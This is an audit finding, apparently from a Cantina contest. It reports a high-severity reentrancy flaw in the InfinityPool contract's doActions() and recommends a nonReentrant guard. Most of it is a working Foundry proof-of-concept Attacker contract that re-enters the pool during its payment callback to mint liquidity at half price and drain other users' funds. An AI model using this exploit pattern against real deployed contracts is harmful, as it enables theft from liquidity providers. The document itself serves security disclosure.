# An attacker can re-enter the InfinityPool contract because `doActions()` doesn't have a reentrancy protection
Severity: High ≈ Likelihood: High × Impact: High

## Finding Description
The `InfinityPool` contract, which manages liquidity for token pairs, is vulnerable to a critical reentrancy attack.

The `doActions()` function lacks proper safeguards, allowing malicious actors to repeatedly call it before the previous execution completes. This vulnerability can be exploited to drain the contract's funds entirely.

The attack is feasible with minimal resources and can be executed at any time by any user interacting with the contract.

## Impact Explanation
In `InfinityPool.doActions` during the final call to `makeUserPay()`, the pool calls the `infinityPoolPaymentCallback()` function on `msg.sender` and expects a certain amount to be transferred to the pool during the callback. For example, this could exploited to add X liquidity while only providing X/2 required amount of tokens as demonstrated by the poc.

This would lead to significant loss of funds and pool insolvency therefore the impact is high.

## Likelihood 
The likelihood is high as an attack is easy and highly incentivized.

## Proof of Concept
Please copy this file as `test/cantina/Reentrancy_PoC.t.sol` and run with `forge test --mt test_reentrancy_doactions`.

It shows an example scenario in which a hypothetical attacker, Alice, steals the liquidity provided by Bob.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {InfinityPoolsBase} from "test/cantina/InfinityPoolsBase.t.sol";
import {console2 as console} from "forge-std/Test.sol";

import {IInfinityPoolPaymentCallback} from "src/interfaces/IInfinityPoolPaymentCallback.sol";
import {IInfinityPool} from "src/interfaces/IInfinityPool.sol";
import {Token} from "src/mock/Token.sol";
import {TUBS, EPOCH} from "src/Constants.sol";
import {Quad, fromInt256, fromUint256} from "src/types/ABDKMathQuad/Quad.sol";

contract POC is InfinityPoolsBase {
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public override {
        super.setUp();

        token0.mint(bob, 9999624237664420591);
        token1.mint(bob, 9999624237664420591);

        Quad liquidity = fromUint256(10);

        vm.startPrank(bob);
        token0.approve(address(infinityPool), 9999624237664420591);
        token1.approve(address(infinityPool), 9999624237664420591);
        infinityPool.pour(0, TUBS, liquidity, "");
        vm.stopPrank();
    }

    function test_reentrancy_doactions() external {
        token0.mint(alice, 999962423766442060);
        token1.mint(alice, 999962423766442060);

        vm.startPrank(alice);

        Attacker attacker = new Attacker(alice, infinityPool, token0, token1);

        token0.transfer(address(attacker), token0.balanceOf(alice));
        token1.transfer(address(attacker), token1.balanceOf(alice));
        attacker.perform();

        vm.stopPrank();

        vm.warp(uint256(EPOCH) + 3 days);

        vm.startPrank(alice);
        attacker.drain(1);
        attacker.drain(2);
        vm.stopPrank();

        vm.warp(uint256(EPOCH) + 12 days);

        vm.startPrank(alice);
        attacker.collect(1);
        attacker.collect(2);
        vm.stopPrank();

        // the balance of Alice is almost x2 after removing the liquidity
        assert(token0.balanceOf(alice) == 1996018744315046452);
        assert(token1.balanceOf(alice) == 1996018744315046452);
    }
}

contract Attacker is IInfinityPoolPaymentCallback {
    address owner;
    IInfinityPool infinityPool;
    Token token0;
    Token token1;

    constructor(address _owner, IInfinityPool _infinityPool, Token _token0, Token _token1) {
        owner = _owner;
        infinityPool = _infinityPool;
        token0 = _token0;
        token1 = _token1;
    }

    function perform() external {
        Quad liquidity = fromUint256(1);
        infinityPool.pour(0, TUBS, liquidity, abi.encode(true, int256(0), int256(0)));
    }

    function drain(uint256 id) external {
        infinityPool.drain(id, owner, "");
    }

    function collect(uint256 id) external {
        infinityPool.collect(id, owner, "");
    }

    function infinityPoolPaymentCallback(int256 expectedToken0, int256 expectedToken1, bytes calldata data) external {
        (bool marker, int256 prevExpected0, int256 prevExpected1) = abi.decode(data, (bool, int256, int256));

        if (marker) {
            Quad liquidity = fromUint256(1);

            IInfinityPool.Action[] memory actions = new IInfinityPool.Action[](1);
            actions[0] = IInfinityPool.Action.POUR;

            bytes[] memory datas = new bytes[](1);
            datas[0] = abi.encode(0, TUBS, liquidity);

            infinityPool.doActions(actions, datas, address(this), abi.encode(false, expectedToken0, expectedToken1));
        } else {
            token0.transfer(address(infinityPool), uint256(prevExpected0));
            token1.transfer(address(infinityPool), uint256(prevExpected1));
        }
    }

}
```

## Recommendation
Add the `nonReentrant` modifier to the `doActions()` function
